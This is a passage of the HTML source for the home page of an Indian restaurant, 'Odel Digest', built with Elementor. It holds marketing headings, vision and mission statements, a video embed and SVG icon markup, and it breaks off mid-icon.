					<ul id="menu-1-581bce9" class="hfe-nav-menu"><li id="menu-item-98" class="menu-item menu-item-type-post_type menu-item-object-page parent hfe-creative-menu"><a href="https://odel.co.in/index.php/contact/" class = "hfe-menu-item">Contact</a></li>
</ul> 
				</nav>
			</div>
					</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-919d196" data-id="919d196" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-da85580 elementor-position-left elementor-vertical-align-middle elementor-hidden-tablet elementor-hidden-mobile elementor-view-default elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-id="da85580" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
			<link rel="stylesheet" href="https://odel.co.in/wp-content/plugins/elementor/assets/css/widget-icon-box.min.css">		<div class="elementor-icon-box-wrapper">

						<div class="elementor-icon-box-icon">
				<span  class="elementor-icon elementor-animation-">
				<svg xmlns="http://www.w3.org/2000/svg" width="39" height="44" viewBox="0 0 39 44" fill="none"><path d="M24.1543 32.7517C27.3239 32.7517 30.1537 31.2744 31.9933 28.9753C35.9012 31.4153 38.4999 35.753 38.5 40.6974V41.5919C38.5 42.5455 37.7269 43.3186 36.7734 43.3186H2.22664C1.27307 43.3186 0.5 42.5455 0.5 41.5919V40.6974C0.5 34.1889 5.0034 28.7319 11.0643 27.2723C12.0434 28.2513 13.1463 29.0506 14.3554 29.6513C14.891 29.9174 15.4389 30.1405 15.9972 30.32C16.6214 31.7506 18.0483 32.7517 19.7103 32.7517H24.1543Z" stroke="#FF384B"></path><path d="M11.5506 20.6477L11.1732 19.617L10.6433 20.5782C10.2961 21.208 9.62711 21.6328 8.85963 21.6328C7.73992 21.6328 6.82422 20.7242 6.82422 19.5973V13.2514C6.82422 12.5725 7.15648 11.9714 7.66962 11.6007L7.85705 11.4653L7.87526 11.2348C8.34926 5.23663 13.3829 0.5 19.5008 0.5C25.6185 0.5 30.6523 5.23663 31.1263 11.2349L31.1445 11.4654L31.3319 11.6008C31.8451 11.9715 32.1773 12.5725 32.1773 13.2515V15.0104V19.5975C32.1773 20.2629 31.8584 20.8538 31.3628 21.2261L31.1631 21.3761V21.6258V22.7155C31.1631 26.5793 28.0189 29.7235 24.1551 29.7235H19.7111C19.1472 29.7235 18.6899 29.2664 18.6899 28.7023C18.6899 28.1383 19.1472 27.6811 19.7111 27.6811H24.1551C26.8936 27.6811 29.1207 25.4539 29.1207 22.7155V21.6258V21.3761L28.921 21.2261C28.6903 21.0527 28.4976 20.8314 28.3576 20.5772L27.8286 19.6163L27.4503 20.6459C27.148 21.4686 26.8118 22.2103 26.383 22.9046C26.2431 23.1312 26.0485 23.4401 25.8196 23.7311C25.5842 24.0304 25.345 24.268 25.1287 24.389C24.8318 24.5549 24.5025 24.6526 24.1552 24.6526H19.7112C18.4173 24.6526 17.2664 25.2601 16.5259 26.2029C14.261 25.2219 12.5179 23.1949 11.594 20.7641C11.5938 20.7635 11.5935 20.763 11.5933 20.7624L11.5895 20.7521L11.5844 20.7382L11.5834 20.7355C11.572 20.7055 11.5612 20.6765 11.5506 20.6477ZM28.885 11.6513L29.1004 11.4818L29.0734 11.2091C28.5931 6.35013 24.4843 2.54254 19.5008 2.54254C14.5172 2.54254 10.4086 6.35014 9.92789 11.2092L9.90091 11.4819L10.1163 11.6514C10.357 11.8407 10.5537 12.0823 10.6889 12.3587L11.1973 13.398L11.6058 12.3155L11.6098 12.3048L11.6103 12.3035C11.6103 12.3035 11.6103 12.3035 11.6103 12.3034C11.6104 12.3033 11.6104 12.3032 11.6105 12.303C12.9566 8.80558 15.9537 6.28653 19.5007 6.28653C22.9725 6.28653 26.018 8.72168 27.3964 12.3179L27.8076 13.3906L28.3124 12.3586C28.4477 12.0822 28.6443 11.8406 28.885 11.6513Z" stroke="#FF384B"></path></svg>				</span>
			</div>
			
						<div class="elementor-icon-box-content">

									<h3 class="elementor-icon-box-title">
						<span  >
							+91 9095888399						</span>
					</h3>
				
				
			</div>
			
		</div>
				</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				</div>
				</header>

	
<main id="content" class="site-main post-4518 page type-page status-publish hentry">

			<div class="page-header">
			<h1 class="entry-title">Odel Main Home</h1>		</div>
	
	<div class="page-content">
				<div data-elementor-type="wp-page" data-elementor-id="4518" class="elementor elementor-4518">
						<section class="elementor-section elementor-top-section elementor-element elementor-element-4a729ba elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="4a729ba" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-ea19155" data-id="ea19155" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-223ed2d elementor-widget elementor-widget-heading" data-id="223ed2d" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.23.0 - 05-08-2024 */
.elementor-heading-title{padding:0;margin:0;line-height:1}.elementor-widget-heading .elementor-heading-title[class*=elementor-size-]>a{color:inherit;font-size:inherit;line-height:inherit}.elementor-widget-heading .elementor-heading-title.elementor-size-small{font-size:15px}.elementor-widget-heading .elementor-heading-title.elementor-size-medium{font-size:19px}.elementor-widget-heading .elementor-heading-title.elementor-size-large{font-size:29px}.elementor-widget-heading .elementor-heading-title.elementor-size-xl{font-size:39px}.elementor-widget-heading .elementor-heading-title.elementor-size-xxl{font-size:59px}</style><h2 class="elementor-heading-title elementor-size-default">Welcome to Odel Digest</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-4743a16 elementor-widget elementor-widget-heading" data-id="4743a16" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Indulge in Authentic <br> Indian Delights</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-6fb21d2 elementor-widget elementor-widget-text-editor" data-id="6fb21d2" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.23.0 - 05-08-2024 */
.elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap{background-color:#69727d;color:#fff}.elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap{color:#69727d;border:3px solid;background-color:transparent}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap{margin-top:8px}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap-letter{width:1em;height:1em}.elementor-widget-text-editor .elementor-drop-cap{float:left;text-align:center;line-height:1;font-size:50px}.elementor-widget-text-editor .elementor-drop-cap-letter{display:inline-block}</style>				<p>A Culinary Journey Through India&#8217;s Flavors Indulge in the Perfect Blend of Spices and Tradition</p>						</div>
				</div>
				<div class="elementor-element elementor-element-5460900 elementor-align-left elementor-widget__width-auto elementor-widget elementor-widget-button" data-id="5460900" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a class="elementor-button elementor-size-sm" role="button">
						<span class="elementor-button-content-wrapper">
									<span class="elementor-button-text">Order Now</span>
					</span>
					</a>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-b1f5ad0" data-id="b1f5ad0" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-ee5b342 elementor-widget elementor-widget-video" data-id="ee5b342" data-element_type="widget" data-settings="{&quot;show_image_overlay&quot;:&quot;yes&quot;,&quot;image_overlay&quot;:{&quot;url&quot;:&quot;https:\/\/odel.co.in\/wp-content\/uploads\/2023\/10\/Screenshot-2023-10-01-140959-e1696149688893.png&quot;,&quot;id&quot;:5066,&quot;size&quot;:&quot;&quot;,&quot;alt&quot;:&quot;&quot;,&quot;source&quot;:&quot;library&quot;},&quot;video_type&quot;:&quot;hosted&quot;,&quot;controls&quot;:&quot;yes&quot;}" data-widget_type="video.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.23.0 - 05-08-2024 */
.elementor-widget-video .elementor-widget-container{overflow:hidden;transform:translateZ(0)}.elementor-widget-video .elementor-wrapper{aspect-ratio:var(--video-aspect-ratio)}.elementor-widget-video .elementor-wrapper iframe,.elementor-widget-video .elementor-wrapper video{height:100%;width:100%;display:flex;border:none;background-color:#000}@supports not (aspect-ratio:1/1){.elementor-widget-video .elementor-wrapper{position:relative;overflow:hidden;height:0;padding-bottom:calc(100% / var(--video-aspect-ratio))}.elementor-widget-video .elementor-wrapper iframe,.elementor-widget-video .elementor-wrapper video{position:absolute;top:0;right:0;bottom:0;left:0}}.elementor-widget-video .elementor-open-inline .elementor-custom-embed-image-overlay{position:absolute;top:0;right:0;bottom:0;left:0;background-size:cover;background-position:50%}.elementor-widget-video .elementor-custom-embed-image-overlay{cursor:pointer;text-align:center}.elementor-widget-video .elementor-custom-embed-image-overlay:hover .elementor-custom-embed-play i{opacity:1}.elementor-widget-video .elementor-custom-embed-image-overlay img{display:block;width:100%;aspect-ratio:var(--video-aspect-ratio);-o-object-fit:cover;object-fit:cover;-o-object-position:center center;object-position:center center}@supports not (aspect-ratio:1/1){.elementor-widget-video .elementor-custom-embed-image-overlay{position:relative;overflow:hidden;height:0;padding-bottom:calc(100% / var(--video-aspect-ratio))}.elementor-widget-video .elementor-custom-embed-image-overlay img{position:absolute;top:0;right:0;bottom:0;left:0}}.elementor-widget-video .e-hosted-video .elementor-video{-o-object-fit:cover;object-fit:cover}.e-con-inner>.elementor-widget-video,.e-con>.elementor-widget-video{width:var(--container-widget-width);--flex-grow:var(--container-widget-flex-grow)}</style>		<div class="e-hosted-video elementor-wrapper elementor-open-inline">
					<video class="elementor-video" src="https://odel.co.in/wp-content/uploads/2023/10/Odel-Digest-Restaurant.mp4" controls="" preload="auto" controlsList="nodownload"></video>
						<div class="elementor-custom-embed-image-overlay" style="background-image: url(https://odel.co.in/wp-content/uploads/2023/10/Screenshot-2023-10-01-140959-e1696149688893.png);">
																<div class="elementor-custom-embed-play" role="button" aria-label="Play Video" tabindex="0">
							<i aria-hidden="true" class="eicon-play"></i>							<span class="elementor-screen-only">Play Video</span>
						</div>
									</div>
					</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ffe482e elementor-hidden-desktop elementor-hidden-tablet elementor-hidden-mobile elementor-widget elementor-widget-image" data-id="ffe482e" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img decoding="async" width="561" height="407" src="https://odel.co.in/wp-content/uploads/2023/08/Group-61.png" class="attachment-large size-large wp-image-4898" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/Group-61.png 561w, https://odel.co.in/wp-content/uploads/2023/08/Group-61-300x218.png 300w" sizes="(max-width: 561px) 100vw, 561px" />													</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-d3204f6 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="d3204f6" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-df55695" data-id="df55695" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-c681d07 elementor-view-default elementor-position-top elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-id="c681d07" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">

						<div class="elementor-icon-box-icon">
				<span  class="elementor-icon elementor-animation-">
				<svg xmlns="http://www.w3.org/2000/svg" width="85" height="85" viewBox="0 0 85 85" fill="none"><rect width="85" height="85" rx="42.5" fill="#FFF9F4"></rect><path d="M59.4837 42.6072C59.1799 42.2559 51.9399 33.9919 42.8148 33.9919C33.6897 33.9919 26.4498 42.2559 26.1459 42.6078C25.9514 42.833 25.9514 43.1675 26.1459 43.3927C26.4498 43.744 33.6897 52.0079 42.8148 52.0079C51.9399 52.0079 59.1799 43.744 59.4837 43.392C59.6784 43.1669 59.6784 42.8324 59.4837 42.6072ZM27.4166 42.9999C28.5096 41.8517 31.9801 38.4665 36.5375 36.5526C34.856 38.1896 33.8069 40.4735 33.8069 42.9999C33.8069 45.5263 34.856 47.8101 36.5375 49.4472C31.9801 47.5334 28.5096 44.1481 27.4166 42.9999ZM42.8148 50.8068C38.5102 50.8068 35.0079 47.3045 35.0079 42.9999C35.0079 38.6953 38.5102 35.193 42.8148 35.193C47.1194 35.193 50.6217 38.6953 50.6217 42.9999C50.6217 47.3045 47.1194 50.8068 42.8148 50.8068ZM49.0927 49.4472C50.7736 47.8102 51.8227 45.5263 51.8227 42.9999C51.8227 40.4735 50.7736 38.1897 49.0921 36.5526C53.6495 38.4665 57.12 41.8517 58.213 42.9999C57.1201 44.1481 53.6502 47.5334 49.0927 49.4472Z" fill="#FF384B"></path><path d="M38.0107 43.0001H39.2118C39.2118 41.0129 40.8278 39.3969 42.815 39.3969V38.1958C40.1661 38.1958 38.0107 40.3511 38.0107 43.0001Z" fill="#FF384B"></path><path d="M46.4186 43C46.4186 44.9872 44.8026 46.6032 42.8154 46.6032V47.8043C45.4644 47.8043 47.6197 45.6489 47.6197 43H46.4186Z" fill="#FF384B"></path><path d="M32.8917 31.7346C32.5728 32.0163 32.2636 32.313 31.9717 32.618L32.8388 33.4486C33.1073 33.1681 33.3925 32.8943 33.6862 32.6355L32.8917 31.7346Z" fill="#FF384B"></path><path d="M29.7004 35.688C29.4944 36.0579 29.3011 36.4416 29.127 36.8278L30.2211 37.3221C30.382 36.9665 30.5592 36.6141 30.749 36.2736L29.7004 35.688Z" fill="#FF384B"></path><path d="M52.7482 31.7437L51.9531 32.6438C52.2462 32.9027 52.5308 33.1759 52.7993 33.4576L53.6676 32.6277C53.3758 32.322 53.0659 32.0247 52.7482 31.7437Z" fill="#FF384B"></path><path d="M42.1854 28C41.7608 28.0174 41.3332 28.0535 40.9141 28.1063L41.0654 29.2984C41.451 29.2491 41.8443 29.2161 42.2352 29.1999L42.1854 28Z" fill="#FF384B"></path><path d="M48.4277 29.072L47.9785 30.1854C48.34 30.3314 48.6991 30.4947 49.0469 30.6706L49.5891 29.5993C49.212 29.4083 48.8211 29.2305 48.4277 29.072Z" fill="#FF384B"></path><path d="M39.6566 28.3196C39.2434 28.4079 38.8285 28.516 38.4219 28.6397L38.772 29.7885C39.1461 29.6744 39.5286 29.5752 39.9087 29.4936L39.6566 28.3196Z" fill="#FF384B"></path><path d="M31.1286 33.5759C30.8607 33.9074 30.6055 34.2527 30.3701 34.6022L31.3658 35.2742C31.5826 34.9536 31.8174 34.6359 32.0636 34.3302L31.1286 33.5759Z" fill="#FF384B"></path><path d="M45.9891 28.3237L45.7363 29.4977C46.1171 29.5794 46.4996 29.6791 46.8719 29.7938L47.2244 28.6456C46.8197 28.5213 46.4041 28.4126 45.9891 28.3237Z" fill="#FF384B"></path><path d="M43.4602 28.0005L43.4092 29.2003C43.8013 29.2165 44.1953 29.2502 44.5796 29.2994L44.7315 28.108C44.3136 28.0551 43.886 28.0185 43.4602 28.0005Z" fill="#FF384B"></path><path d="M55.9359 35.7014L54.8867 36.2857C55.0771 36.628 55.2549 36.9811 55.414 37.3349L56.5094 36.8413C56.3358 36.4562 56.1437 36.0731 55.9359 35.7014Z" fill="#FF384B"></path><path d="M34.9401 30.2158C34.5786 30.4392 34.223 30.68 33.8838 30.9316L34.5996 31.8967C34.9119 31.6649 35.238 31.4433 35.5713 31.2379L34.9401 30.2158Z" fill="#FF384B"></path><path d="M54.5082 33.5867L53.5732 34.3403C53.8182 34.6442 54.0525 34.9619 54.2705 35.285L55.2667 34.613C55.0295 34.2616 54.7748 33.9163 54.5082 33.5867Z" fill="#FF384B"></path><path d="M50.7017 30.2239L50.0693 31.2448C50.4014 31.4508 50.7281 31.6724 51.041 31.9042L51.7568 30.9403C51.4175 30.6881 51.062 30.4467 50.7017 30.2239Z" fill="#FF384B"></path><path d="M37.2154 29.0659C36.825 29.2232 36.4335 29.4004 36.0527 29.592L36.5938 30.6645C36.9439 30.488 37.3043 30.3252 37.664 30.1799L37.2154 29.0659Z" fill="#FF384B"></path><path d="M44.5643 56.7017C44.1788 56.7509 43.7855 56.784 43.3945 56.8001L43.4444 58C43.869 57.9825 44.2966 57.9465 44.7157 57.8937L44.5643 56.7017Z" fill="#FF384B"></path><path d="M41.0504 56.7002L40.8984 57.8916C41.3164 57.9445 41.744 57.9811 42.1697 57.9991L42.2208 56.7993C41.8286 56.7831 41.4347 56.7495 41.0504 56.7002Z" fill="#FF384B"></path><path d="M38.7568 56.2063L38.4043 57.3545C38.809 57.4788 39.2246 57.5875 39.6396 57.6764L39.8924 56.5024C39.5111 56.42 39.1291 56.3204 38.7568 56.2063Z" fill="#FF384B"></path><path d="M46.8575 56.2114C46.4833 56.3255 46.1008 56.4246 45.7207 56.5063L45.9729 57.6803C46.3861 57.592 46.8011 57.4839 47.2076 57.3602L46.8575 56.2114Z" fill="#FF384B"></path><path d="M32.8303 52.5425L31.9619 53.3724C32.2537 53.6781 32.5636 53.9753 32.8813 54.2563L33.6764 53.3562C33.3834 53.0974 33.0988 52.8241 32.8303 52.5425Z" fill="#FF384B"></path><path d="M30.2165 48.6655L29.1211 49.1591C29.2946 49.5441 29.4868 49.9272 29.6946 50.2989L30.7437 49.7146C30.5534 49.3723 30.3756 49.0192 30.2165 48.6655Z" fill="#FF384B"></path><path d="M31.358 50.7153L30.3623 51.3873C30.5995 51.7387 30.8541 52.084 31.1207 52.4136L32.0552 51.66C31.8102 51.3561 31.576 51.0384 31.358 50.7153Z" fill="#FF384B"></path><path d="M34.5898 54.0959L33.874 55.0598C34.2128 55.312 34.5682 55.5534 34.9286 55.7762L35.5609 54.7553C35.2288 54.5499 34.9022 54.3283 34.5898 54.0959Z" fill="#FF384B"></path><path d="M36.5823 55.3301L36.04 56.4014C36.4178 56.5924 36.8087 56.7702 37.2014 56.9287L37.6507 55.8153C37.2892 55.6694 36.93 55.506 36.5823 55.3301Z" fill="#FF384B"></path><path d="M51.0302 54.1033C50.718 54.3351 50.3919 54.5567 50.0586 54.7621L50.6897 55.7842C51.0513 55.5608 51.4068 55.32 51.7461 55.0684L51.0302 54.1033Z" fill="#FF384B"></path><path d="M49.035 55.3357C48.6849 55.5122 48.3246 55.675 47.9648 55.8203L48.4129 56.9343C48.8032 56.777 49.1948 56.5998 49.5755 56.4082L49.035 55.3357Z" fill="#FF384B"></path><path d="M52.7907 52.5515C52.5223 52.832 52.237 53.1058 51.9434 53.3646L52.7379 54.2654C53.0568 53.9837 53.366 53.687 53.6579 53.382L52.7907 52.5515Z" fill="#FF384B"></path><path d="M55.4078 48.678C55.2469 49.0335 55.0697 49.386 54.8799 49.7265L55.9284 50.312C56.1344 49.942 56.3277 49.5583 56.5019 49.1722L55.4078 48.678Z" fill="#FF384B"></path><path d="M54.2632 50.7256C54.0464 51.0463 53.8117 51.364 53.5654 51.6696L54.5004 52.4239C54.7683 52.0924 55.0235 51.7471 55.2589 51.3976L54.2632 50.7256Z" fill="#FF384B"></path></svg>				</span>
			</div>
			
						<div class="elementor-icon-box-content">

									<h3 class="elementor-icon-box-title">
						<span  >
							Vision						</span>
					</h3>
				
									<p class="elementor-icon-box-description">
						To be the epitome of authentic Indian cuisine, celebrated for our commitment to quality, taste, and cultural appreciation.					</p>
				
			</div>
			
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-61989aa elementor-align-center elementor-widget elementor-widget-button" data-id="61989aa" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a class="elementor-button elementor-size-sm" role="button">
						<span class="elementor-button-content-wrapper">
									<span class="elementor-button-text">Discover More</span>
					</span>
					</a>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-335d6a1" data-id="335d6a1" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-3066a8a elementor-view-default elementor-position-top elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-id="3066a8a" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">

						<div class="elementor-icon-box-icon">
				<span  class="elementor-icon elementor-animation-">
				<svg xmlns="http://www.w3.org/2000/svg" width="85" height="85" viewBox="0 0 85 85" fill="none"><rect width="85" height="85" rx="42.5" fill="#FFF9F4"></rect><path d="M57.6497 32.8228L57.6564 32.8494L57.6687 32.8739C57.8209 33.1784 57.7537 33.4781 57.5086 33.7231L53.3713 37.8605C53.2826 37.9492 53.2038 38.0057 53.1233 38.0415C53.0438 38.0769 52.95 38.0976 52.824 38.0976H49.1004H48.9968L48.9236 38.1708L43.0279 44.0665C42.871 44.2234 42.6257 44.3036 42.4806 44.3036C42.3356 44.3036 42.0903 44.2234 41.9334 44.0665C41.6173 43.7504 41.6173 43.2881 41.9334 42.972L47.8291 37.0763L47.9023 37.0031V36.8995V33.1759C47.9023 33.0499 47.923 32.9561 47.9583 32.8766C47.9942 32.796 48.0507 32.7173 48.1394 32.6286L52.2767 28.4913C52.5218 28.2462 52.8215 28.179 53.1259 28.3312L53.1505 28.3435L53.1771 28.3502C53.4372 28.4152 53.6083 28.6892 53.6083 29.0385V32.1415V32.3915H53.8583H56.9614C57.3107 32.3915 57.5847 32.5626 57.6497 32.8228Z" stroke="#FF384B" stroke-width="0.5"></path><path d="M42.4803 46.8724C43.3605 46.8724 44.2617 46.5442 44.837 45.8604L47.3985 43.2989C47.4019 43.375 47.402 43.4499 47.402 43.5193C47.402 46.2774 45.2384 48.441 42.4803 48.441C39.7222 48.441 37.5586 46.2774 37.5586 43.5193C37.5586 40.7613 39.7222 38.5977 42.4803 38.5977C42.5497 38.5977 42.6246 38.5977 42.7007 38.6011L40.1352 41.1667C38.7882 42.4057 38.7983 44.5267 40.1235 45.8603C40.6987 46.5442 41.6 46.8724 42.4803 46.8724Z" stroke="#FF384B" stroke-width="0.5"></path><path d="M52.8241 40.6663C53.7043 40.6663 54.6055 40.3382 55.1808 39.6544L55.929 38.9061C56.451 40.4118 56.7115 41.9219 56.7115 43.5193C56.7115 51.3456 50.3071 57.75 42.4807 57.75C34.6544 57.75 28.25 51.3456 28.25 43.5193C28.25 35.693 34.6544 29.2886 42.4807 29.2886C44.0781 29.2886 45.5883 29.549 47.0939 30.071L46.3457 30.8192C45.6619 31.3945 45.3337 32.2957 45.3337 33.1759V35.9471L44.7053 36.4184C44.0054 36.2219 43.1952 36.0289 42.3773 36.0289C38.2053 36.0289 34.8869 39.3473 34.8869 43.5193C34.8869 47.6913 38.2053 51.0097 42.3773 51.0097C46.5493 51.0097 49.8677 47.6913 49.8677 43.5193C49.8677 42.7315 49.7763 41.9267 49.4978 41.2L50.0315 40.6663H52.8241Z" stroke="#FF384B" stroke-width="0.5"></path></svg>				</span>
			</div>
			
						<div class="elementor-icon-box-content">

									<h3 class="elementor-icon-box-title">
						<span  >
							Mission						</span>
					</h3>
				
									<p class="elementor-icon-box-description">
						We aim to create a dining experience that transports our patrons to the heart of India through our dishes, ambience, and hospitality.					</p>
				
			</div>
			
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a318d02 elementor-align-center elementor-widget elementor-widget-button" data-id="a318d02" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a class="elementor-button elementor-size-sm" role="button">
						<span class="elementor-button-content-wrapper">
									<span class="elementor-button-text">Discover More</span>
					</span>
					</a>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-e3b17c0" data-id="e3b17c0" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-db49f52 elementor-view-default elementor-position-top elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-id="db49f52" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">

						<div class="elementor-icon-box-icon">
				<span  class="elementor-icon elementor-animation-">
				<svg xmlns="http://www.w3.org/2000/svg" width="85" height="85" viewBox="0 0 85 85" fill="none"><rect width="85" height="85" rx="42.5" fill="#FFF9F4"></rect><path d="M53.9496 41.9958C55.8564 39.428 56.3776 37.1271 55.4369 35.5C54.6615 34.1653 53.0089 33.4534 50.6445 33.4534C49.7547 33.4534 48.8013 33.5551 47.7971 33.7458C46.564 30.2246 44.6445 28 42.4454 28C40.2462 28 38.3267 30.2246 37.0937 33.7458C36.0894 33.5551 35.1361 33.4534 34.2462 33.4534C31.8818 33.4534 30.2293 34.1653 29.4538 35.5C28.5132 37.1271 29.0471 39.428 30.9411 41.9958C31.1954 42.3263 31.4623 42.6695 31.7547 43C29.3267 45.822 28.3606 48.5932 29.4538 50.5C30.2293 51.8347 31.8818 52.5466 34.2462 52.5466C35.1361 52.5466 36.0894 52.4449 37.0937 52.2542C38.3267 55.7627 40.2462 58 42.4454 58C44.6445 58 46.564 55.7754 47.7971 52.2542C48.8013 52.4449 49.7547 52.5466 50.6445 52.5466C53.0089 52.5466 54.6615 51.8347 55.4369 50.5C56.5301 48.5932 55.564 45.8093 53.1361 42.9873C53.4284 42.6568 53.6954 42.3263 53.9496 41.9958ZM50.6445 34.3814C52.0555 34.3814 53.8861 34.661 54.6361 35.9703C55.3733 37.2415 54.8394 39.2373 53.1996 41.4492C52.9835 41.7415 52.7547 42.0212 52.5132 42.3136C51.5216 41.2712 50.3394 40.2288 49.0047 39.2373C48.814 37.572 48.5089 36.0339 48.1022 34.661C48.992 34.4703 49.8564 34.3814 50.6445 34.3814ZM45.3564 48.0466C44.3903 48.6059 43.4242 49.1017 42.4454 49.5339C41.4666 49.1017 40.4877 48.5932 39.5344 48.0466C38.5683 47.4873 37.653 46.8898 36.7886 46.2669C36.6869 45.2119 36.6233 44.1186 36.6233 43C36.6233 41.8814 36.6869 40.7881 36.7886 39.7331C37.6403 39.1102 38.5683 38.5127 39.5344 37.9534C40.5005 37.3941 41.4666 36.8983 42.4454 36.4661C43.4242 36.8983 44.403 37.4068 45.3564 37.9534C46.3225 38.5127 47.2505 39.1102 48.1022 39.7331C48.2038 40.7881 48.2674 41.8814 48.2674 43C48.2674 44.1186 48.2038 45.2119 48.1022 46.2669C47.2377 46.8898 46.3352 47.4873 45.3564 48.0466ZM47.9496 47.5127C47.7589 48.822 47.492 50.0551 47.1488 51.161C46.0174 50.8941 44.8098 50.5127 43.6022 50.0297C44.3394 49.6737 45.0894 49.2797 45.8267 48.8602C46.564 48.428 47.2759 47.9703 47.9496 47.5127ZM41.2886 50.0297C40.0683 50.5127 38.8733 50.8941 37.742 51.161C37.4115 50.0551 37.1445 48.822 36.9411 47.5127C37.6276 47.9831 38.3267 48.428 39.064 48.8475C39.814 49.2797 40.5513 49.661 41.2886 50.0297ZM35.7844 45.5042C34.7547 44.6907 33.8267 43.8517 33.0259 43C33.814 42.161 34.7547 41.3093 35.7844 40.4831C35.7208 41.2966 35.6954 42.1356 35.6954 42.9873C35.6954 43.8644 35.7208 44.7034 35.7844 45.5042ZM36.9411 38.4873C37.1318 37.178 37.3988 35.9576 37.7293 34.839C38.8606 35.1059 40.0683 35.4873 41.2759 35.9703C40.5386 36.3263 39.7886 36.7203 39.0513 37.1398C38.3267 37.5847 37.6149 38.0297 36.9411 38.4873ZM43.6149 35.9703C44.8352 35.4873 46.0301 35.1059 47.1615 34.839C47.492 35.9449 47.7589 37.178 47.9496 38.4873C47.2759 38.0297 46.564 37.5847 45.8267 37.1525C45.0894 36.7203 44.3522 36.339 43.6149 35.9703ZM49.1191 40.4958C50.1615 41.322 51.0894 42.161 51.8776 43.0127C51.0767 43.8644 50.1488 44.7161 49.1191 45.5169C49.1827 44.7034 49.2081 43.8644 49.2081 43C49.2081 42.1483 49.17 41.3093 49.1191 40.4958ZM42.4454 28.928C44.1869 28.928 45.7759 30.8983 46.8691 33.9364C45.4581 34.2669 43.9581 34.7754 42.4454 35.4364C40.9327 34.7754 39.4454 34.2669 38.0344 33.9364C39.1149 30.8983 40.7038 28.928 42.4454 28.928ZM31.6911 41.4364C30.0513 39.2246 29.5301 37.2288 30.2547 35.9576C31.0047 34.6483 32.8352 34.3686 34.2462 34.3686C35.0344 34.3686 35.8988 34.4576 36.8013 34.6229C36.3945 35.9958 36.0767 37.5466 35.8988 39.2119C34.5513 40.2034 33.3691 41.2458 32.3903 42.2881C32.1361 42.0085 31.9072 41.7288 31.6911 41.4364ZM34.2589 51.6186C32.8479 51.6186 31.0174 51.339 30.2674 50.0297C29.3903 48.517 30.3055 46.1525 32.403 43.6992C33.4072 44.7542 34.5894 45.7839 35.8988 46.7627C36.0894 48.428 36.3945 49.9788 36.814 51.3644C35.8988 51.5297 35.0471 51.6186 34.2589 51.6186ZM42.4454 57.072C40.7038 57.072 39.1149 55.1017 38.0344 52.0636C39.4454 51.7331 40.9454 51.2246 42.4454 50.5636C43.9581 51.2246 45.4454 51.7331 46.8691 52.0636C45.7886 55.1017 44.1996 57.072 42.4454 57.072ZM54.6361 50.0424C53.8861 51.3517 52.0555 51.6314 50.6445 51.6314C49.8564 51.6314 48.992 51.5424 48.0894 51.3771C48.4962 49.9915 48.814 48.4534 49.0047 46.7754C50.3267 45.7966 51.5089 44.767 52.5005 43.7119C54.5979 46.1653 55.5005 48.5169 54.6361 50.0424Z" fill="#FF384B"></path><path d="M42.4455 40.6355C41.1361 40.6355 40.0811 